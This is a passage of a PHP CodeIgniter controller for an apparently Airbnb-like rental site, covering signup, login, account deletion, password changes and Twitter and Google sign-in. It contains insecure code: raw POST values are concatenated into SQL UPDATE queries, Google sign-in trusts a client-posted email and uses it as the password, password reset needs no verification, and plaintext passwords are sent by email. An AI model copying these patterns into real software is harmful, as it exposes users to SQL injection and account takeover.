$this->db->set('ref_rent',$rent)->where('id',$this->dx_auth->get_user_id())->update('users');//echo $this->db->last_query();
				
				$this->session->unset_userdata('referral_code');
				
			$notification                     = array();
			$notification['user_id']										= $this->dx_auth->get_user_id();
			$notification['new_review ']						= 1;
			$notification['leave_review']				 = 1;
			$this->Common_model->insertData('user_notification', $notification);
			
			//Need to add this data to user profile too 
			$add['Fname']    = $first_name;
			$add['Lname']    = $last_name;
			$add['id']       = $this->dx_auth->get_user_id();
			$add['email']    = $email;
			$this->Common_model->insertData('profiles', $add);
			
			 $referralcode=$referral_code['referral_code'] ;
		
			
			if($referralcode != "")
	        {
			$this->Referrals_model->get_user_refId($referralcode);
			$user = $this->Referrals_model->get_user_refId($referralcode)->result();
			foreach ($user as $us) {
				$email_user=$us->email;
				$user_name=$us->username;				
			}
			$admin_email = $this->dx_auth->get_site_sadmin();
				$admin_name  = $this->dx_auth->get_site_title();
			$email_name = 'User_join_to_Referal_mail';
		$splVars    = array("{site_name}" => $this->dx_auth->get_site_title(),"{friend_name}" => $first_name, "{user_name}" => $email_user,"{refer_name}" =>$user_name);
		$this->Email_model->sendMail($email_user,$admin_email,ucfirst($admin_name),$email_name,$splVars);
	        }
			//End of adding it
			$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Logged in successfully.')));
			redirect('home/dashboard','refresh');
		}
		}
        if($this->input->get('airef'))
		{
			$check = $this->db->where('referral_code',$this->input->get('airef'))->get('users');
			$this->session->set_userdata('referral_code',$this->input->get('airef'));

			if($check->num_rows()!=0)
			{
				$this->session->set_userdata('referral_code',$this->input->get('airef'));
			}
			else {
				$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('error',translate('Sorry Your Referral code is wrong.')));
			redirect('users/signUp','refresh');
			}
		}
		
		$data["title"]               = get_meta_details('Sign_Up_for_the_site','title');
		$data["meta_keyword"]        = get_meta_details('Sign_Up_for_the_site','meta_keyword');
		$data["meta_description"]    = get_meta_details('Sign_Up_for_the_site','meta_description');
	    $data['fb_app_id'] = $this->db->get_where('settings', array('code' => 'SITE_FB_API_ID'))->row()->string_value;
		$data['google_app_id'] = $this->db->get_where('settings', array('code' => 'SITE_GOOGLE_CLIENT_ID'))->row()->string_value;
		$data['message_element']     = "users/view_signUp";
		$this->load->view('template',$data);
	}


function _check_user_name($username)
	{
		if ($this->dx_auth->is_username_available($username))
		{
			return true;			
		} 
		else 
		{
			$this->form_validation->set_message('_check_user_name', translate('Sorry username is not available'));
			return false;
		}//If end 
	}	
function _check_user_email($email)
	{
		if ($this->dx_auth->is_email_available($email))
		{
			return true;			
		} 
		else 
		{
			$this->form_validation->set_message('_check_user_email', translate('Sorry this email has already been registered'));
			return false;
		}//If end 
	}	
	
	/*script for sign in
	 * 
	 */
	public function signin($param ='', $param1='')
	{
		
		if ($this->dx_auth->is_logged_in() || autologin() == 1)
		{ 
			header("Cache-Control: no-cache, must-revalidate");
            header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
			redirect('home/dashboard');
		}

	  $this->session->unset_userdata('image_url');
	  
	  if($this->input->get('search'))
	  {
	  	 $this->session->set_userdata('redirect_to','search');
	  }
	  
	  if($this->input->get('home'))
	  {
	  	 $this->session->set_userdata('redirect_to','home');
	  }
	  
	  if($this->input->get('account'))
	  {
	  	 $this->session->set_userdata('redirect_to','account/wishlists/'.$this->input->get('id'));
	  }

	   if($this->input->get('rooms'))
	  {
	  	 $this->session->set_userdata('redirect_to','rooms/'.$this->input->get('id'));
	  }
	  
		//Intialize values for library and helpers	
		$this->form_validation->set_error_delimiters($this->config->item('field_error_start_tag'), $this->config->item('field_error_end_tag'));
		
		if($this->input->post())
		{
					if ( !$this->dx_auth->is_logged_in())
					{
						// Set form validation rules
						$this->form_validation->set_rules('username', 'Username or Email', 'required|trim|xss_clean');
						$this->form_validation->set_rules('password', 'password', 'required|trim|xss_clean');
						//$this->form_validation->set_rules('remember', 'Remember me', 'integer');
						
						if($this->form_validation->run())
						{
								$username = $this->input->post("username");
								$password = $this->input->post("password");
								$remember_me = $this->input->post("remember_me");
								
								if ($this->dx_auth->login($username, $password, $remember_me))
								{
									// Redirect to homepage
									$newdata = array(
																					'user'      => $this->dx_auth->get_user_id(),
																					'username'  => $this->dx_auth->get_username(),
																					'logged_in' => TRUE
																				);
									$this->session->set_userdata($newdata);
									
									$this->Common_model->updateTableData('login_history',0,array('session_id'=>$this->session->userdata('session_id')),array('user_id'=>$this->dx_auth->get_user_id()));
						
									if($this->session->userdata('redirect_to'))
									{
									  $redirect_to = $this->session->userdata('redirect_to');
											$this->session->unset_userdata('redirect_to');
											redirect($redirect_to, 'refresh');
									}
									else
										{
											$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Logged in successfully.')));
											redirect('home/dashboard/', 'refresh');
										}
								}

								else
								{
									$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('error',translate('Either the username or password is wrong. Please try again!')));
									redirect('users/signin');
								}
						}
					}
					else
					{
					   $this->session->set_flashdata('flash_message', $this->Common_model->flash_message('error',translate('You are already logged in. Logout to login again!')));
								redirect('home/index', 'refresh');
					}
		}
		
		if($param == 'logout')
		{
		   
		 	if($param1 == 1)
			{
				$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('error',translate('You are Banned by admin.')));
				redirect('users/signin');
			}
           else 
			{
				
				$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('You are logged out successfully.')));
				redirect('users/signin');
			}
		}
		if($param == 'cancel')
		{
			$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Your account has been cancelled successfully.')));
				redirect('users/signin');
		}
		
		$data["title"]               = get_meta_details('Sign_In / Sign_Up','title');
		$data["meta_keyword"]        = get_meta_details('Sign_In / Sign_Up','meta_keyword');
		$data["meta_description"]    = get_meta_details('Sign_In / Sign_Up','meta_description');
	    $data['fb_app_id'] = $this->db->get_where('settings', array('code' => 'SITE_FB_API_ID'))->row()->string_value;
		$data['google_app_id'] = $this->db->get_where('settings', array('code' => 'SITE_GOOGLE_CLIENT_ID'))->row()->string_value;
		$data['message_element']     = "users/view_signIn"; //from template
		$this->load->view('template',$data);
	}
	
	
	function login()
	{
			$data['title']               = get_meta_details('Sign_In / Sign_up','title');
			$data["meta_keyword"]        = get_meta_details('Sign_In / Sign_up','meta_keyword');
			$data["meta_description"]    = get_meta_details('Sign_In / Sign_up','meta_description');
	        $data['fb_app_id'] = $this->db->get_where('settings', array('code' => 'SITE_FB_API_ID'))->row()->string_value;
			$data['google_app_id'] = $this->db->get_where('settings', array('code' => 'SITE_GOOGLE_CLIENT_ID'))->row()->string_value;
			$data['message_element']     = "users/view_signIn";
						
			$this->load->view('template', $data);
	}
	

		function logout()  
		{
								
				$data["title"]               = get_meta_details('Logout_Shortly','title');
				$data["meta_keyword"]        = get_meta_details('Logout_Shortly','meta_keyword');
				$data["meta_description"]    = get_meta_details('Logout_Shortly','meta_description');
				
				$is_banned = $this->db->where('id',$this->dx_auth->get_user_id())->where('banned',1)->get('users')->num_rows();

			$this->Common_model->updateTableData('login_history',0,array('session_id'=>$this->session->userdata('session_id')),array('logout'=>1));

			$this->dx_auth->logout();  
			
			$user = array(					
			'DX_user_id'						       => '',
			'DX_username'						      => '',
			'DX_emailId'						       => '',
			'DX_refId'						         => '',
			'DX_role_id'						       => '',			
			'DX_role_name'					      => '',
			'DX_parent_roles_id'		   => '',	// Array of parent role_id
			'DX_parent_roles_name'	  => '', // Array of parent role_name
			'DX_permission'					     => '',
			'DX_parent_permissions'	 => '',			
			'DX_logged_in'					      => TRUE
		);
			$this->session->unset_userdata($user);
			$this->session->unset_userdata('image_url');
						
				if( $this->facebook_lib->logged_in() )
				{
					$facebook->destroySession();       
                     $this->session->sess_destroy();
				}
			redirect('users/signin/logout/'.$is_banned); 
		    
		}


  
     function cancel_account() {
				
			   	        $userid= $this->dx_auth->get_user_id();
						//$user_value = $this->db->where('userby',$userid)->get('reservation')->row()->userby;
						//$user_value1 = $this->db->where('userby',$userid)->get('reservation')->row()->userto;
						//print_r($user_value1);exit;
						
						if($userid == 1) {
							
						   $this->session->set_flashdata('flash_message', $this->Common_model->flash_message('error',translate('Administrator account cannot be deleted')));
						    redirect('account/settings', 'refresh'); 
						 //   redirect('home/index', 'refresh'); 	
						}
						
						
					/*	$this->db->where('userby',$userid);
						$this->db->or_where('userto',$userid);
						$query=$this->db->get('reservation');
						
                        $this->db->where("('status'=0 OR 'status'=1 OR 'status'=3 OR 'status'=4 OR 'status'=7 OR 'status'=25)", NULL, FALSE);
						$query = $this->db->get('reservation')->num_rows();						
						
						
						 echo $this->db->last_query(); exit;
						
						
						
						$result="SELECT * FROM (`reservation`) WHERE (`userby` =$userid  OR `userto` =$userid) AND ('status'=0 OR 'status'=1 OR 'status'=3 OR 'status'=4 OR 'status'=7 OR 'status'=25)";
						print_r($result);
						exit; */
					 $final = $this->db->where('userto', $userid)->or_where('userby', $userid)->where("('status'=0 OR 'status'=1 OR 'status'=2 OR 'status'=3 OR 'status'=4 OR 'status'=5 OR 'status'=6 OR 'status'=7 OR 'status'=11 OR 'status'=12 OR 'status'=13)", NULL, FALSE)->get('reservation');
					$final1 = $this->db->where('userto', $userid)->or_where('userby', $userid)->get('contacts');	
					
					$userto2 = $final1->row()->userto;
						$userby2 = $final1->row()->userby;
					$temp=$final1->row()->status;
				   
					if(($userto2==$userid || $userby2==$userid) && ($temp==1 || $temp==3))
					{
						  $this->session->set_flashdata('flash_message', $this->Common_model->flash_message('error',translate('Your account cannot be deleted, Because either  your list has booked or your reservation is pending')));
							
							redirect('account/settings', 'refresh'); 
						
					}
					
					
					
						$userto1 = $final->row()->userto;
						$userby1 = $final->row()->userby;
						$status1 = $final->row()->status;
				        $pay     =$final->row()->is_payed;
					 
					
					// if( ($userto1==$userid || $userby1==$userid) && ($status1==0|| $status1==1|| $status1==2||$status1==3||$status1==4 || $status1==5|| $status1==6 || $status1==7|| $status1==11 || $status1==12||$status1==13)) 
			          if( ($userto1==$userid || $userby1==$userid) && ($status1==0|| $status1==1|| $status1==2||$status1==3||$status1==4 || $status1==5|| $status1==6 || $status1==7|| $status1==11 || $status1==12||$status1==13) && ($pay==0)  )
			          {
			      
						    $this->session->set_flashdata('flash_message', $this->Common_model->flash_message('error',translate('Your account cannot be deleted, Because either  your list has booked or your reservation is pending')));
							
							redirect('account/settings', 'refresh'); 
				        
					  
                       } else {
                       	   $Reason 	= $this->input->post('reason');
						   $Details 	= $this->input->post('details');
						   $Contact 	= $this->input->post('contact_ok'); 
						
					       $data =array(
 					           'tell_why_your_leaving' 	=> $Reason,
					           'comment' 				=> $Details,
					           'contact_ok'				=> $Contact         
							);
						
						  $this->db->insert('cancel_my_account_details',$data);
						  
						    $UserDetails = $this->db->where('id',$userid)->get('users');
					   		$Admin_email 		= 	$this->dx_auth->get_site_sadmin();
								
				  //mail send functiopn start
						   
							  $to = $UserDetails->row('email');
							  $email_name='cancel your account';
							  $admin_name=$this->dx_auth->get_site_title();
							  $splVars    = array("{site_name}" => $this->dx_auth->get_site_title());
						      $this->Email_model->sendMail($to,$Admin_email ,$admin_name,$email_name,$splVars);
					
					//mail send function end
					
					//mail send function for admin
					
							 if($Details == '') 
							 $Details = '-';
					
					         
							  $email_name		=	'cancel_account_to_admin';
							  $admin_name		=	$this->dx_auth->get_site_title();
							  $splVars    = array(
							  
							  
							  "{site_name}" 		=> $this->dx_auth->get_site_title(),
							  "{username}"			=> ucfirst($UserDetails->row('username')),
							  "{reason}"			=> ucfirst($Reason),
							  "{details}"			=> ucfirst($Details),
							  "{contact}"			=> ucfirst($Contact)
							  );
						      $this->Email_model->sendMail($Admin_email, $Admin_email, $admin_name, $email_name, $splVars);
					
					//mail send function for admin
					 
					//delete list
					
								 $ListDetails = $this->db->select('id')->where('user_id',$userid)->get('list');
									if($ListDetails->num_rows() != 0) {
										foreach($ListDetails->result() as $List) {
											$ListId = $List->id;
											
											$this->db->delete('coupon_users', array('list_id' => $ListId));
											$this->db->delete('list_pay', array('list_id' => $ListId));
											$this->db->delete('list_photo', array('list_id' => $ListId));  
											$this->db->delete('seasonalprice', array('list_id' => $ListId));
											$this->db->delete('statistics', array('list_id' => $ListId));
											$this->db->delete('price', array('id' => $ListId));
											$this->db->delete('messages', array('list_id' => $ListId));
											$this->db->delete('ical_import', array('list_id' => $ListId));
											$this->db->delete('contacts', array('list_id' => $ListId));  
											$this->db->delete('reviews', array('list_id' => $ListId));
										}
									}
									
									
									
								 $this->db->delete('list', array('user_id' => $userid)); 
					 
					 //delete list
					 
					//calender status
							    $data=$this->db->where('userby',$userid)->get('reservation')->result();
								if(isset($data)) { 
								    foreach ($data as $row) {
						        	  $this->db->where('list_id',$row->list_id)->where('booked_days >=',$row->checkin)->where('booked_days <=',$row->checkout)->delete('calendar');	
								    }
								}
					//calender status
					  //reservation
					           
					            $this->db->delete('reservation',array('userby'=>$userid));
					            $this->db->delete('reservation',array('userto'=>$userid));
				 	 
					 //reservation
					 
					 //profiles
					  
							   $email=$this->db->where('id',$userid)->get('users')->row('email');
							   if(!empty($email)) {
							   $this->db->delete('profiles',array('email' =>$email));
							   $this->db->delete('profile_picture',array('email' =>$email));
							   }
							   
					  
					   //profiles
					  
					  //users
					  		  $this->db->delete('payout_preferences',array('user_id'=>$userid)); 
					   		  $this->db->delete('users', array('id' => $userid)); 
					  
					  //users  

					 
				    $data["title"]               = get_meta_details('Logout_Shortly','title');
					$data["meta_keyword"]        = get_meta_details('Logout_Shortly','meta_keyword');
					$data["meta_description"]    = get_meta_details('Logout_Shortly','meta_description');
							
							$is_banned = $this->db->where('id',$this->dx_auth->get_user_id())->where('banned',1)->get('users')->num_rows();
			
						$this->Common_model->updateTableData('login_history',0,array('session_id'=>$this->session->userdata('session_id')),array('logout'=>1));
			
						$this->dx_auth->logout();  
						
						$user = array(					
						'DX_user_id'						       => '',
						'DX_username'						      => '',
						'DX_emailId'						       => '',
						'DX_refId'						         => '',
						'DX_role_id'						       => '',			
						'DX_role_name'					      => '',
						'DX_parent_roles_id'		   => '',	// Array of parent role_id
						'DX_parent_roles_name'	  => '', // Array of parent role_name
						'DX_permission'					     => '',
						'DX_parent_permissions'	 => '',			
						'DX_logged_in'					      => TRUE
					);
						$this->session->unset_userdata($user);
						$this->session->unset_userdata('image_url');
									
							if( $this->facebook_lib->logged_in() )
							{
								$facebook->destroySession();       
			                     $this->session->sess_destroy();
							}
						
						redirect('users/signin/cancel/'.$is_banned);
				 	
				 } 	
		}
    
	
	function change_password()
	{
		// Check if user logged in or not
		// if( ($this->dx_auth->is_logged_in()) || ($this->facebook_lib->logged_in()) || ($this->twitter->is_logged_in()))
		 if( ($this->dx_auth->is_logged_in()) || ($this->facebook_lib->logged_in()))
		{			
			$val = $this->form_validation;
			// Set form validation
			$val->set_rules('old_password', 'Old Password', 'required|trim|xss_clean|min_length['.$this->min_password.']|max_length['.$this->max_password.']|callback__check_password');
			$val->set_rules('new_password', 'New Password', 'required|trim|xss_clean|min_length['.$this->min_password.']|max_length['.$this->max_password.']|callback_check_new_password|matches[confirm_new_password]');
			$val->set_rules('confirm_new_password', 'Confirm new Password', 'required|trim|xss_clean');
		
			if($val->run())
			{
				$result = $this->db->where('id',$this->dx_auth->get_user_id())->from('users')->get();
				
			$old_pass = $this->_check_password($this->input->post('old_password'));

	if($result->num_rows() != 0)
	{
		if($old_pass == 1)
		{
			$new_pass = crypt($this->dx_auth->_encode($this->input->post('new_password')));
			
			if($this->input->post('new_password') == $this->input->post('old_password'))
			{
 				$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('error',translate('Your new password cannot be the same as the old password.')));
				redirect('users/change_password/'.$this->dx_auth->get_user_id());
			}
			
			$this->db->where('id',$this->dx_auth->get_user_id())->update('users',array('password'=>$new_pass));
	            
	            $admin_email = $this->dx_auth->get_site_sadmin();
				$admin_name  = $this->dx_auth->get_site_title();
						
				$email_name  = 'reset_password';
				$splVars     = array("{site_name}" => $this->dx_auth->get_site_title(), "{password}" => $val->set_value('new_password'));
						
				//Send Mail
				$this->Email_model->sendMail($this->dx_auth->get_emailId(), $admin_email, ucfirst($admin_name), $email_name, $splVars);
			
				$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Your password has successfully been changed.')));
				redirect('users/change_password/'.$this->dx_auth->get_user_id());
	}
	}
	}
			else
			{
				$data['title']               = get_meta_details('Change_Password','title');
				$data["meta_keyword"]        = get_meta_details('Change_Password','meta_keyword');
				$data["meta_description"]    = get_meta_details('Change_Password','meta_description');
				
				$data['message_element']     = 'users/view_change_password';
				$this->load->view('template',$data);
			}
		}
		else
		{
			// Redirect to login page
			redirect('users/signin');
		}
	}	
	
	function check_new_password($value)
{
	$confirm = $value;
	
	$pre_encode = $this->dx_auth->_encode($confirm);
	
	$id = $this->dx_auth->get_user_id();
		
		$old_password = $this->Common_model->getTableData('users',array('id'=>$id))->row()->password;
		
		if(crypt($pre_encode, $old_password) != $old_password)
		{
			return true;
		}
		else
			{
				$this->form_validation->set_message('check_new_password', translate('Your new password cannot be the same as the old password.'));
				return false;
			}
}
	
	function _check_password()
	{
	 $password     = $this->input->post('old_password');
		
		$user_id      = $this->dx_auth->get_user_id();
		
		
		$stored_hash  = get_user_by_id($user_id)->password;
		
		
	 $password     = $this->dx_auth->_encode($password);

		if (crypt($password, $stored_hash) === $stored_hash)
		{
			return true;			
		} 
		else 
		{

			$this->form_validation->set_message('_check_password', translate('Your Old Password Is Wrong'));
			return false;
		}//If end
	}	
	
	
	//Ajax Apge
	function forgot_password()
	{
		$val = $this->form_validation;
		$this->load->library(array('email', 'table'));
		// Set form validation rules
	  if($this->input->post("email"))
	  {
	     $val->set_rules('email', translate('Please Enter the Valid Email'), 'required|valid_email');
		 
		 if( $this->form_validation->run())
		 {	
				extract($this->input->post());
				
				$conditions["email"]   = $email;
				
				$conditions['banned']  = '0';
				
				$members_query         = $this->Common_model->getTableData("users",$conditions);
				
				$members               = $members_query->result();
					
				if(count($members)==0)
				{
					echo translate("This email address doesn't exist in our database");
					
					exit;
				}
				else
				{
					$data['password']    = $this->dx_auth->_gen_pass();
					
					// Encode & Crypt password
					$encode              = crypt($this->dx_auth->_encode($data['password'])); 
					
					$user_detail         = $this->Users_model->get_user_by_email($email)->result();
					
					if(count($user_detail))
					{						
						$this->Users_model->set_user($user_detail[0]->id, array("password"=>$encode));	
						
						$admin_email = $this->dx_auth->get_site_sadmin();
						$admin_name  = $this->dx_auth->get_site_title();
						
						$email_name = 'forgot_password';
						$splVars    = array("{site_name}" => $this->dx_auth->get_site_title(), "{email}" => $email, "{password}" => $data['password'], "{date}" => date('m/d/Y'), "{time}" => date('g:i A'));
						
						//Send Mail
						$this->Email_model->sendMail($email,$admin_email,ucfirst($admin_name),$email_name,$splVars);
									
						echo translate("An email has been sent to your email with instructions with how to activate your new password.");exit;
					}
				}
				redirect('users/signin');
			}
		    else{
					echo translate("This is invalid email address");
					exit;
			}
		}
		
		$this->load->view(THEME_FOLDER.'/users/view_forgot_password');

	}
	
	
	function reset_password()
	{
		// Get username and key
		$username = $this->uri->segment(3);
		$key      = $this->uri->segment(4);

		// Reset password
		if ($this->dx_auth->reset_password($username, $key))
		{
			$data['auth_message'] = translate('You have successfully reset you password').', '.anchor(site_url($this->dx_auth->login_uri), translate('Login'));
			$this->load->view($this->dx_auth->reset_password_success_view, $data);
		}
		else
		{
			$data['auth_message'] = translate('Reset failed. Your username and key are incorrect. Please check your email again and follow the instructions.');
			$this->load->view($this->dx_auth->reset_password_failed_view, $data);
		}
	}
	
	
	public function change_language()
	{
	 	$string_value  = $this->input->post('lang_code');
		$rows = $this->Common_model->getTableData('language', array('code' => $string_value))->row();
		$this->session->set_userdata('language',$rows->name);
		$this->session->set_userdata('locale',$string_value);
	}

	  public function change_languages()
    {
        /* original content */
        $string_value  = $this->input->post('lang');
        $rows = $this->Common_model->getTableData('language', array('name' => $string_value))->row();
       	$this->session->set_userdata('language',var_dump($rows->name));
        $this->session->set_userdata('locale',$rows->code);   
    }
	
		public function change_currency()
	{
	 $string_value  = $this->input->post('currency_code');
		
		$this->session->set_userdata('locale_currency',$string_value);
	}
		
		
	public function Twitter_MailId_Popup()
	{
	 $twitter_id =  $this->twconnect->tw_user_id;	
	  //$user_id = $this->twitter->get_userId();
	  $mailId  = $this->input->post('email');
	  	  
	  $username  = $this->input->post('username');
	
	  $user_id = $this->Users_model->createTwitterUser($twitter_id,$username);
	  
	  $query_users = $this->db->query('UPDATE users SET email="'.$mailId.'" WHERE twitter_id="'.$twitter_id.'"');
	$query_profiles = $this->db->query('UPDATE profiles SET email="'.$mailId.'" WHERE id="'.$user_id.'"');
	
	$image_url = $this->session->userdata('image_url');
		 
		 $split = explode('.', $image_url);
          
         $url = $split[0].'.'.$split[1].'.'.$split[2];
                            
         $data_tw['src'] = $url;
         $data_tw['ext'] = '.'.$split[3];
         $data_tw['email'] = $mailId;
		 
         $this->db->insert('profile_picture',$data_tw);	
	
	$referral_code['referral_code']     = $this->session->userdata('referral_code');
	
   $refer=$this->db->query("select * from `referral_management` where `id`=1 ")->row();
		$refamt=$refer->fixed_amt;
		$refcur=$refer->currency;
		$type=$refer->type;
		$trip_amt=$refer->trip_amt;
		$trip_per=$refer->trip_per;
		$rent_amt=$refer->rent_amt;
		$rent_per=$refer->rent_per;
		$ref_total=get_currency_value2($refcur,'USD',$refamt);
		if($type==1){
			$trip_amt0=$trip_amt;
			$rent_amt0=$rent_amt;
		$trip=get_currency_value2($refcur,'USD',$trip_amt);
		$rent=get_currency_value2($refcur,'USD',$rent_amt);
		}
		if($type==0){
			$trip=(($trip_per)/100)*$ref_total;
			$rent=(($rent_per)/100)*$ref_total;
		$current = $this->session->userdata("locale_currency");
			
		}	
$this->db->set('trips_referral_code',$referral_code['referral_code'])->where('twitter_id',$twitter_id)->update('users');
$this->db->set('list_referral_code',$referral_code['referral_code'])->where('twitter_id',$twitter_id)->update('users');
$this->db->set('ref_total',$ref_total)->where('twitter_id',$twitter_id)->update('users');
$this->db->set('ref_trip',$trip)->where('twitter_id',$twitter_id)->update('users');
$this->db->set('ref_rent',$rent)->where('twitter_id',$twitter_id)->update('users');
       $user = array(					
			'DX_user_id'			 => $user_id,
			'DX_username'			 => $username,
			'DX_emailId'			 => $mailId,
		//	'DX_refId'				 => $data->ref_id,
		//	'DX_role_id'			 => $data->role_id,			
		//	'DX_role_name'			 => $role_data['role_name'],
		//	'DX_parent_roles_id'	 => $role_data['parent_roles_id'],	// Array of parent role_id
		///	'DX_parent_roles_name'	 => $role_data['parent_roles_name'], // Array of parent role_name
		//	'DX_permission'			 => $role_data['permission'],
		//	'DX_parent_permissions'	 => $role_data['parent_permissions'],			
			'DX_logged_in'			 => TRUE
		);
	
		$this->session->set_userdata($user); 
		$this->Common_model->updateTableData('login_history',0,array('session_id'=>$this->session->userdata('session_id')),array('user_id'=>$this->dx_auth->get_user_id()));
 $condition     = array("id" => $this->dx_auth->get_user_id());
						$data['via_login']= "twitter";
						$this->Common_model->updateTableData('users', NULL, $condition, $data);
						
						$referralcode=$this->session->userdata('referral_code');

						if($referralcode != "")
	        {
			$this->Referrals_model->get_user_refId($referralcode);
			$user = $this->Referrals_model->get_user_refId($referralcode)->result();
			foreach ($user as $us) {
				$email_user=$us->email;
				$user_name=$us->username;				
			}
					
				$admin_name  = $this->dx_auth->get_site_title();
			$email_name = 'User_join_to_Referal_mail';
		$splVars    = array("{site_name}" => $this->dx_auth->get_site_title(),"{friend_name}" => $username, "{user_name}" => $email_user,"{refer_name}" =>$user_name);
		$this->Email_model->sendMail($email_user,$admin_email,ucfirst($admin_name),$email_name,$splVars);
			}
	 redirect('users/signup');
	 

	} 
     function check_username_twitter(){
	   $username=$this->input->get('username');
	   $data['checked'] = $this->Users_model->check_username_twitter($username);
	   echo json_encode($data['checked']);   
   }
 function check_email_twitter(){
	   $email=$this->input->get('email');
	   $data['checked'] = $this->Users_model->check_email_twitter($email);
	   echo json_encode($data['checked']);
   
   }	
   function canvas()
 {	
	$path=base_url()."users/signup";
	echo("<script> top.location.href='" . $path . "'</script>");
}
 public function fb_exists_email($id)
		{
			$query = $this->Common_model->getTableData('users', array('email' => $id));
			$q     = $query->num_rows();
			if($q != 0)
				return TRUE;
			else return FALSE;
		}
	
  function google_signin()
 {

extract($this->input->post());

$user = $name;

/* if(!$this->_check_user_name($user))
{
	$user_name = explode('@',$email);
	$user = $user_name[0];
}
*/

 $google_id = $id;
 $email=$email;
$query=$this->Users_model->getUserInfobyemail_id($email);
$fbid=$query['fb_id'] ;
$googleid=$query['google_id'];
$userid=$query['id'];
$username=$query['username'];

$remember_me=1;

if($fbid)
{
	$name=$query['username'];
	
	//echo $fb_id;
	$user_info = $this->Users_model->getUserInfobyfb_username($name);
			$this->Users_model->FacebookUserLast($id);
			$user = array(					
			'DX_user_id'			 => $user_info['id'],
			'DX_username'			 => $user_info['username'],
			'DX_emailId'			 => $user_info['email'],
			'DX_role_id'			 => $user_info['role_id'],					
			'DX_logged_in'			 => TRUE
		);
	
		$this->session->set_userdata($user); 
		$this->Common_model->updateTableData('login_history',0,array('session_id'=>$this->session->userdata('session_id')),array('user_id'=>$this->dx_auth->get_user_id()));
		$condition     = array("id" => $this->dx_auth->get_user_id());
						$data['fb_id'] = $id; 
						$data['via_login']= "facebook";
						$this->Common_model->updateTableData('users', NULL, $condition, $data);
		echo 'users/signup';
}

else {
if ($this->dx_auth->login($user, $email))
								{
									// Redirect to homepage
									$newdata = array(
																					'user'      => $this->dx_auth->get_user_id(),
																					'username'  => $this->dx_auth->get_username(),
																					'logged_in' => TRUE
																				);
									$this->session->set_userdata($newdata);
									$this->Common_model->updateTableData('login_history',0,array('session_id'=>$this->session->userdata('session_id')),array('user_id'=>$this->dx_auth->get_user_id()));
									 $condition     = array("id" => $this->dx_auth->get_user_id());
						$data_via['via_login']= "google";
						$this->Common_model->updateTableData('users', NULL, $condition, $data_via);
						
									if($this->session->userdata('redirect_to'))
									{
									  $redirect_to = $this->session->userdata('redirect_to');
											$this->session->unset_userdata('redirect_to');
											//redirect($redirect_to, 'refresh');
											echo $redirect_to;exit;
									}
									else
									{
									  $this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Logged in successfully.')));
											//redirect('home/dashboard/', 'refresh');
											echo 'home/dashboard';exit;
									}
								}

								else
								
						{
									if($this->_check_user_name($user) && $this->_check_user_email($email))
									{
									$data = $this->dx_auth->register($user, $email, $email);
		$this->dx_auth->login($user, $email, 'TRUE');
		$this->Common_model->updateTableData('login_history',0,array('session_id'=>$this->session->userdata('session_id')),array('user_id'=>$this->dx_auth->get_user_id()));
		 $condition     = array("id" => $this->dx_auth->get_user_id());
						$data_via['via_login']= "google";
						$data_via['google_id']= $google_id;
						$this->Common_model->updateTableData('users', NULL, $condition, $data_via);
		 
		//To check user come by reference
		if($this->session->userdata('ref_id'))
		$ref_id      = $this->session->userdata('ref_id');
		else
		$ref_id      = "";
		
		if(!empty($ref_id))
		{
		$details     = $this->Referrals_model->get_user_by_refId($ref_id);
		$invite_from = $details->row()->id;
		
						$insertData                    = array();
						$insertData['invite_from']     = $invite_from;
						$insertData['invite_to']       = $this->dx_auth->get_user_id();
						$insertData['join_date']       = local_to_gmt();
						
						$this->Referrals_model->insertReferrals($insertData);
						   			$this->session->unset_userdata('ref_id');
			}
				
				
			//referral amount 
			$referral_code['referral_code']     = $this->session->userdata('referral_code');
				$refer=$this->db->query("select * from `referral_management` where `id`=1 ")->row();
		$refamt=$refer->fixed_amt;
		$refcur=$refer->currency;
		$type=$refer->type;
		$trip_amt=$refer->trip_amt;
		$trip_per=$refer->trip_per;
		$rent_amt=$refer->rent_amt;
		$rent_per=$refer->rent_per;
		$ref_total=get_currency_value2($refcur,'USD',$refamt);
		if($type==1){
			$trip_amt0=$trip_amt;
			$rent_amt0=$rent_amt;
		$trip=get_currency_value2($refcur,'USD',$trip_amt);
		$rent=get_currency_value2($refcur,'USD',$rent_amt);
		}
		if($type==0){
			$trip=(($trip_per)/100)*$ref_total;
			$rent=(($rent_per)/100)*$ref_total;
		$current = $this->session->userdata("locale_currency");
			
		}	
$this->db->set('trips_referral_code',$referral_code['referral_code'])->where('id',$this->dx_auth->get_user_id())->update('users');
$this->db->set('list_referral_code',$referral_code['referral_code'])->where('id',$this->dx_auth->get_user_id())->update('users');
$this->db->set('ref_total',$ref_total)->where('id',$this->dx_auth->get_user_id())->update('users');
$this->db->set('ref_trip',$trip)->where('id',$this->dx_auth->get_user_id())->update('users');
$this->db->set('ref_rent',$rent)->where('id',$this->dx_auth->get_user_id())->update('users');	$this->session->unset_userdata('referral_code');
						
			$notification                     = array();
			$notification['user_id']						= $this->dx_auth->get_user_id();
			$notification['new_review ']						= 1;
			$notification['leave_review']				 = 1;
			$this->Common_model->insertData('user_notification', $notification);
			
			//Need to add this data to user profile too 
			$add['Fname']    = $first_name;
			$add['Lname']    = $last_name;
			$add['id']       = $this->dx_auth->get_user_id();
			$add['email']    = $email;
			$this->Common_model->insertData('profiles', $add);
			
			$data_gp['src'] = str_replace("?sz=50", "?sz=250", $imageurl ) ;
         	$data_gp['email'] = $email;
		 
         $this->db->insert('profile_picture',$data_gp);	
			//mail send to referred 
			$referralcode=$referral_code['referral_code'] ;
		
			
			if($referralcode != "")
	        {
			$this->Referrals_model->get_user_refId($referralcode);
			$user = $this->Referrals_model->get_user_refId($referralcode)->result();
			foreach ($user as $us) {
				$email_user=$us->email;
				$user_name=$us->username;				
			}
			$admin_email = $this->dx_auth->get_site_sadmin();
				$admin_name  = $this->dx_auth->get_site_title();
			$email_name = 'User_join_to_Referal_mail';
